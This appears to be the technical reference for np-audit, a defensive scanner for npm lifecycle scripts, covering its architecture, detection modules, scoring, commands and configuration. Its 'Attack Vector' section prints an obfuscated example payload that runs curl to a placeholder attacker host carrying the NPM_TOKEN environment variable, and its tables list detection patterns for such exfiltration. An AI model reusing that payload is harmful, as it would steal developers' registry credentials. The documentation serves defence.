# np-audit technical architecture and command reference

[README](../README.md) | [Canary Killer technical architecture](CANARY_KILLER_TECHNICAL.md) | [Validation records](validation/canary-killer/README.md)

np-audit statically inspects npm lifecycle code and optional vulnerability records before its controlled installation commands. Canary Killer adds local repository inspection and a separate protection gate. This document covers architecture, commands, configuration, scoring and supporting references.

## Architecture

| Component | Responsibility |
| --- | --- |
| [CLI](../src/cli.js) and [command loader](../src/commands/index.js) | Parse arguments, load configuration, route commands and apply configured canary protection |
| [Dependency scanner](../src/core/scanner.js) | Select packages from lockfiles/manifests, inspect local or downloaded package content, and aggregate findings |
| [Command parser](../src/utils/command.js) and [import walker](../src/core/requireWalker.js) | Resolve recognizable static script entrypoints and local imports without executing them |
| [Detector](../src/core/detector.js) and [marshallers](../src/marshallers/index.js) | Produce heuristic code findings and package vulnerability findings |
| [Output](../src/utils/output.js) and command reports | Present scores, findings and policy outcomes |
| [Installation/review](../src/utils/review.js) and [npm launcher](../src/utils/npm.js) | Apply blocking/review decisions, perform the configured pre-launch check, and launch real npm |
| [Repository scanner](../src/core/repositoryScanner.js), [repair](../src/core/canaryRepair.js) and [protection](../src/core/canaryProtection.js) | Report local evidence, repair confirmed canary calls, quarantine untrusted canaries and gate controlled launches |
| [Node preload](../src/core/canaryPreload.js) and [Windows terminal installer](../bin/install-canary-terminal.ps1) | Reuse protection before Node entrypoints and configure approved current-user startup hooks |

Dependency scores and repository coverage reports are separate. Canary indicators and behavior-review findings do not automatically assign a malware verdict. The [Canary Killer guide](CANARY_KILLER_TECHNICAL.md#scope-and-reporting) defines its coverage, action policy, exit codes and documented gaps.

## Runtime and distribution

The checkout requires Node.js 18 or newer. Runtime source uses Node built-in modules. The package manifest also declares `c8`, which is used by the coverage command.

From a checkout, use `node bin/npa.js <command>`. The registry-package examples below select the published npm package. They do not select this checkout's files or verify that its Canary Killer implementation has been published:

```bash
npx np-audit scan express
npm install -g np-audit
npa scan
npa install
alias npm='npa'
```

## Marshallers

Detection is split into modular marshallers — each one detects a single attack signal:

| Marshaller | What it detects | Score |
| ---------- | --------------- | ----- |
| `eval/dynamic-exec` | `eval()`, `new Function()`, indirect eval, `vm.*`, `setTimeout` with string | 8 |
| `obfuscator.io` | `_0x` variable naming patterns (obfuscator.io output) | 9–80 |
| `high-entropy-string` | Long strings or concatenation chains with high Shannon entropy | 6 |
| `hex-escape-density` | Dense `\xNN` and `\uXXXX` escape sequences | 5–50 |
| `fromCharCode` | `String.fromCharCode` with many args, large decimal char-code arrays | 7 |
| `encoded-decode` | Base64/hex decode (`atob`, `Buffer.from`) optionally combined with `eval` | 3–8 |
| `child-process` | `require('child_process')`, `exec`, `spawn`, `fork`, worker_threads | 5 |
| `hex-array` | Large numbers of `0x` hex literal values | 7–60 |
| `process-env` | `process.env` access (credential exfiltration signal) | 3 |
| `network-call` | `require('https')`, `fetch()`, `dns`, `net`, `tls` | 4 |
| `filesystem-manipulation` | `fs.writeFile`, `chmod`, `symlink` (backdoor persistence) | 3–4 |
| `runtime-download` | Downloads and executes external runtimes (Bun, Deno) | 9–50 |
| `vscode-autorun` | VS Code tasks with `runOn: folderOpen` (auto-execution) | 30 |
| `known-vulnerability` | Known CVEs via Snyk API or OSV.dev | 4–6 (WARN), 80 (malicious) |

Scores are heuristic policy signals. Several checks increase their scores with matching counts. The detector selects the highest finding score; the scanner carries the highest script/file score into the package result and incorporates package-level vulnerability findings. The default thresholds are `blockScore: 7` and `warnScore: 4`. `BLOCK` is rendered as DANGER. A label is a policy result, not proof of malware or host integrity.

See [CONTRIBUTING.md](../CONTRIBUTING.md) for how to write custom marshallers.

---

## Vulnerability Scanning (CVE)

When `checkVulnerabilities` is enabled and its marshaller is active, scanned packages are checked against vulnerability databases alongside code analysis.

**Default: OSV.dev (no setup required)**

Works out of the box — queries the free [OSV.dev](https://osv.dev/) API for known vulnerabilities and malicious package advisories.

**Optional: Snyk API (richer data)**

```bash
# Environment variable
export SNYK_API_TOKEN=your-token-here

# Or via Snyk CLI
snyk auth
```

Token resolution order: `SNYK_API_TOKEN` → `SNYK_TOKEN` → `~/.config/configstore/snyk.json`

| Severity | Score | Verdict |
| -------- | ----- | ------- |
| Malicious package | 80 | DANGER |
| 10+ vulnerabilities | 6 | WARN |
| 5–9 vulnerabilities | 5 | WARN |
| 1–4 vulnerabilities | 4 | WARN |

With the default thresholds, non-malicious vulnerability findings score 4-6 and produce warnings. Malware advisories score 80 and block installation. Static code findings can also reach the blocking threshold. Changing thresholds changes this policy.

---

## Canary Killer

The repository scanner complements the package audit by inspecting local scripts, Git hooks and canary files. Read-only scans report evidence and coverage. Explicit protection repairs confirmed calls, quarantines untrusted canaries and updates ignore rules. A matching trusted path and SHA-256 preserves reviewed intentional canaries.

See the [Canary Killer architecture, commands and coverage](CANARY_KILLER_TECHNICAL.md) and [recorded validation results](validation/canary-killer/README.md). Windows terminal activation uses the same protection code before Node entrypoints and selected shell launches. Its installed current-user hooks and real-process verification are described in that guide.

---

## Usage

### Commands

Examples using `npa` assume its executable is available on PATH. From a checkout, replace `npa` with `node bin/npa.js` while in the checkout, or use the CLI's absolute path from another project.

| Command                        | Alias       | Description                        |
| ------------------------------ | ----------- | ---------------------------------- |
| `npa install [package]`        | `npa i`     | Audit then run `npm install`       |
| `npa ci`                       | —           | Audit then run `npm ci`            |
| `npa scan [package]`           | `npa s`     | Scan only, no install              |
| `npa canary-killer <root> [root...]` | —      | [Optional repository scan](CANARY_KILLER_TECHNICAL.md) |
| `npa canary-monitor <root> [root...]` | —     | Watch folders and apply protection automatically; preserve trusted canaries |
| `npa canary-guard <root> [root...]` | —       | Print session settings to check before Node scripts start |
| `npa canary-run <root> [root...] -- <program> [arguments...]` | — | Apply protection before launching the supplied command |
| `npa config get`               | `npa c get` | Show current configuration         |
| `npa config set <key> <value>` | `npa c set` | Update a config value              |
| `npa alias --install`          | —           | Install shell alias                |
| `npa alias --uninstall`        | —           | Remove shell alias                 |

Any unrecognized command is forwarded to npm (e.g. `npa run test`, `npa publish`).

### Flags

| Flag        | Alias | Works with              | Description                                      |
| ----------- | ----- | ----------------------- | ------------------------------------------------ |
| `--review`  | `-r`  | `install`, `ci`         | Interactive mode — choose which scripts to allow |
| `--json`    | —     | `install`, `ci`, `scan`, `canary-killer` | Machine-readable JSON output                     |
| `--quarantine` | —  | `canary-killer`         | Repair direct canary calls, quarantine files and append ignore rules |
| `--protect-canary` | — | `scan`, `install`, `ci`, forwarded npm commands | Enable protection for this command |
| `--no-dev`  | —     | `install`, `ci`, `scan` | Skip devDependencies                             |
| `--verbose` | —     | `install`, `ci`, `scan` | Show fetch progress and extra detail             |
| `--skip`    | —     | `install`, `ci`         | Skip auditing for this command                   |
| `--version` | `-v`  | —                       | Print version and exit                           |
| `--help`    | `-h`  | —                       | Print help and exit                              |

### Interactive `--review` mode

```bash
npa install --review
```

```
  npa --review mode
  Use ↑/↓ to navigate, SPACE to toggle, ENTER to confirm, q to quit

  Found 3 package(s) with install scripts:

     [✓ allow] esbuild@0.24.2       postinstall: post-install.js     OK
   ▶ [✗ deny ] evil-sdk@1.0.0       postinstall: install.js          DANGER (score: 9)
     [✓ allow] @scope/pkg@2.1.0     postinstall: install.js          WARN (score: 5)

  2 allowed  1 denied
```

---

## Configuration

Config is stored in `~/.npmauditor.json` (global) and can be overridden per project with `.npmauditor.json`.

```bash
npa config get                              # Show current config
npa config set blockScore 6                 # Block at score 6+
npa config set skipPackages '["esbuild"]'   # Trust specific packages
npa config set skipScopes '["@types"]'      # Trust entire scopes
```

### All config keys

| Key               | Default                      | Description                             |
| ----------------- | ---------------------------- | --------------------------------------- |
| `blockScore`      | `7`                          | Score threshold for DANGER (exit 1)     |
| `warnScore`       | `4`                          | Score threshold for WARN (exit 0)       |
| `registry`        | `https://registry.npmjs.org` | npm registry URL                        |
| `timeout`         | `30000`                      | HTTP request timeout (ms)               |
| `parallelFetches` | `5`                          | Concurrent downloads                    |
| `skipScopes`      | `[]`                         | `@scope` prefixes to skip               |
| `skipPackages`    | `[]`                         | Package names to skip                   |
| `silent`          | `false`                      | Suppress output when no issues found    |
| `scanSelf`        | `true`                       | Scan own project lifecycle scripts      |
| `maxTarballSize`  | `50MB`                       | Max unpacked tarball size (bomb protection) |
| `checkVulnerabilities` | `true`                  | Check packages against CVE databases    |
| `deepResolve`     | `false`                      | Resolve full transitive dependency tree |
| `disabledMarshallers` | `[]`                    | Marshaller names to skip during scanning |
| `canaryProtection` | `false` | Enable canary protection before controlled commands |
| `canaryRoots` | `[]` | Additional explicitly selected protection roots |
| `canaryTrustedFiles` | `[]` | Exact canary paths and reviewed SHA-256 hashes |
| `canaryTrustedReferenceFiles` | `[]` | Root-level exact manifest/hook fixture paths and reviewed hashes |

### Disabling marshallers

You can disable specific detection checks by adding their names to `disabledMarshallers`:

```bash
npa config set disabledMarshallers '["process-env", "network-call"]'
```

To see all available marshaller names and their current status:

```bash
npa config marshallers
```

This is useful when a marshaller produces false positives for your workflow. Disabled marshallers are skipped entirely during both static code analysis and package-level checks.

---

## Shell Alias

Use npa as a transparent npm replacement:

```bash
npa alias --install     # adds: alias npm='npa'
source ~/.zshrc         # reload shell
```

With the alias active, `npm install` and `npm ci` route through the dependency audit. Other npm commands forward to npm. Canary protection also runs before controlled commands when configured. The alias command can install Bash/Zsh profile entries; its automatic PowerShell installation is unsupported. Use the separate Canary Killer terminal installer for its Windows guard setup.

```bash
npa alias --uninstall   # remove the alias
```

---

## Dependency audit flow

1. **Parse** `package-lock.json` (v1/v2/v3) or resolve from `package.json`
2. **Fetch** tarballs from registry (or read from `node_modules`)
3. **Parse** lifecycle commands — splits `&&`/`||`/`;`/`|`, handles `node -e`, `sh -c`, shell scripts
4. **Walk** the `require()`/`import` graph from each entry (cycle detection, 50 file / 5 MB cap)
5. **Analyze** with all marshallers — static code checks + CVE database queries
6. **Score** and classify: BLOCK / WARN / OK (`BLOCK` is displayed as DANGER)
7. **Report** or proceed with install

---

## The Attack Vector

Supply chain attacks abuse npm lifecycle scripts. When you run `npm install`, any `preinstall`/`install`/`postinstall` script runs automatically. Attackers hide payloads behind obfuscation:

```js
var _0x3f2a = ['\x72\x65\x71\x75\x69\x72\x65', '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'];
eval(String.fromCharCode(114,101,113,117,105,114,101)+'(\'child_process\').exec(\'curl http://evil.example.com/\'+process.env.NPM_TOKEN)');
```

Real-world incidents:

- **[event-stream (2018)](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident)** — Bitcoin wallet credential theft
- **[ua-parser-js (2021)](https://github.com/advisories/GHSA-pjwm-rvh2-c87w)** — crypto miner + info-stealer
- **[node-ipc (2022)](https://snyk.io/blog/peacenotwar-malicious-npm-node-ipc-package-vulnerability/)** — geo-targeted wiper malware
- **[colors / faker (2022)](https://snyk.io/blog/open-source-npm-packages-colors-faker/)** — maintainer sabotage
- **[SAP CAP / cds-dbs (2025)](https://community.sap.com/t5/technology-blog-posts-by-sap/cap-developers-call-to-action-to-mitigate-and-apply-solution-provided-in/ba-p/14387683)** — compromised package targeting enterprise developers

The analysis reads code without executing the scanned scripts. After an audit permits installation, npm may run lifecycle scripts. Interactive review can install with scripts disabled and then run the scripts the user allows. These command-execution paths are separate from static analysis.

---

## Exit Codes

| Code | Meaning                             |
| ---- | ----------------------------------- |
| `0`  | No packages blocked; warnings may be present          |
| `1`  | One or more packages blocked        |

---

## License

[MIT license and copyright notice](../LICENSE). The full license remains in `LICENSE`.
